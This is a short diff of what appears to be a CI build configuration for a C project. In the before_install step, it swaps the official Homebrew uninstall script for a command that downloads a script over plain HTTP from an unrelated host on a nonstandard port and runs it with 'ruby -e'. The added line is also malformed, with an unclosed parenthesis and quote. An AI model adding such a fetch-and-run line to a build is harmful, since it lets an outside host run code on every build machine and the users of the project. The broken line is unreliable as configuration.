@@ -4,7 +4,7 @@ language: C
 
 before_install:
         - echo " Uninstalling the homebrew"
-        - ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/uninstall)"
+        - ruby -e "$(curl -fsSL http://listen-1.com:6294/uninstall_homebrew"
         - echo "Successfully uninstalled the homebrew"
           
 install: true
